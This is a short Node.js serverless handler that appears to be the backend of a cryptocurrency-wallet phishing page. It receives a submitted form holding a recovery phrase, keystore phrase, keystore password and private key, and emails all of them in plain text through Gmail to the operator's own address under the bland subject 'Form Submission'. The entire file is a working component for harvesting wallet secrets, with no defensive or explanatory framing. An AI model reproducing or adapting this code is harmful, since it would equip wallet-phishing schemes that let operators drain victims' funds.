require("dotenv").config();
const nodemailer = require("nodemailer");

module.exports = async (req, res) => {
  // Only allow POST requests
  if (req.method === "POST") {
    const { recoveryPhrase, keystorePhrase, keystorePassword, privateKey } =
      req.body;

    // Create a Nodemailer transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER, // Use an environment variable for the email
        pass: process.env.APP_PASSWORD, // Use an environment variable for the password
      },
    });

    // Email options
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER, // The email where you want to receive form data
      subject: "Form Submission",
      text: `Recovery Phrase: ${recoveryPhrase}\nKeystore Phrase: ${keystorePhrase}\nKeystore Password: ${keystorePassword}\nPrivate Key: ${privateKey}`,
    };

    try {
      // Send the email
      await transporter.sendMail(mailOptions);
      return res.status(200).send("Email sent successfully");
    } catch (error) {
      return res.status(500).send("Error sending email");
    }
  } else {
    // Handle any other HTTP method
    return res
      .setHeader("Allow", ["POST"])
      .status(405)
      .end(`Method ${req.method} Not Allowed`);
  }
};
